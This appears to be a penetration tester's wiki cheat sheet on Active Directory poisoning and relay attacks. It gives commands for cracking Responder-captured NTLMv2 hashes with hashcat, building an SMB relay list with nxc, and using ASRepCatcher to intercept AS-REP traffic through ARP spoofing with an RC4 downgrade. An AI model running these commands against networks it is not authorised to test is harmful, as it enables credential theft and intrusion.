---
layout: wiki
title: Poisoning and Relay
cate1: Internals
cate2: Step 2
description: Poisoning and Relay
keywords: Internals
---

# Poisoning and Relay
## Responder
**[Responder](https://github.com/lgandx/Responder)**
  - IPv6/IPv4 LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay.

```
hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt
/opt/tools/Responder/ (location of Responder)
```

**Multirelay**
  - [Multirelay with responder](https://www.sikich.com/insight/using-multirelay-with-responder-for-penetration-testing/)

## SMB Relay 
**[SMB Relay]**
```
nxc smb [IP] --gen-relay-list relay.txt
```

## ASRep Relay
Use [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) to MITM AS-REP packets that are traversing across the network through ARP spoofing. This works for all users on the VLAN. This also forces Kerberos authentication to be done via RC4.

```
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```

